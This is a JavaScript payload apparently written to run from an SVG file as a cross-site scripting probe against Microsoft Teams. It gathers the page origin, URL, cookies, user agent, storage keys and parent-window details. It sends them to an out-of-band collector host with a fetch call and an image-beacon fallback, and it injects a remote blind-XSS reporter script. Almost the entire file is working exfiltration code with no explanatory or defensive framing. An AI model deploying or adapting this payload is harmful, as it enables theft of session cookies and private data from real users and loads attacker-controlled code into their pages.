svg.script:
// Probe 1: What context are we in?
var C = 'o21c1mes8ezi4ox5wz9mmhhpikwlgcwi8.oast.site';
var info = {
  origin: location.origin,
  href: location.href.substring(0, 200),
  domain: document.domain,
  cookie: document.cookie.substring(0, 200),
  userAgent: navigator.userAgent.substring(0, 150),
  windowName: window.name
};

// Check for Teams-specific objects
try { info.nativeInterface = !!window.nativeInterface; } catch(e) {}
try { info.teams = !!window.teams; } catch(e) {}
try { info.microsoftTeams = !!window.microsoftTeams; } catch(e) {}
try { info.webkit = !!window.webkit; } catch(e) {}

// Check localStorage/sessionStorage
try { info.lsKeys = Object.keys(localStorage).join(',').substring(0, 200); } catch(e) { info.lsErr = e.message; }
try { info.ssKeys = Object.keys(sessionStorage).join(',').substring(0, 200); } catch(e) { info.ssErr = e.message; }

// Check parent/opener
try { info.parentOrigin = window.parent.location.origin; } catch(e) { info.parentErr = e.message; }
try { info.openerOrigin = window.opener ? window.opener.location.origin : 'none'; } catch(e) { info.openerErr = e.message; }

// Exfiltrate
var params = Object.keys(info).map(function(k) {
  return k + '=' + encodeURIComponent(String(info[k] || '').substring(0, 300));
}).join('&');

// Multiple exfil methods
fetch('https://' + C + '/svg-exec?' + params).catch(function() {
  new Image().src = 'https://' + C + '/svg-exec-img?' + params;
});

// Also load blind XSS reporter
var s = document.createElementNS('http://www.w3.org/1999/xhtml', 'script');
s.src = 'https://xss.report/c/ztlsavior';
document.documentElement.appendChild(s);
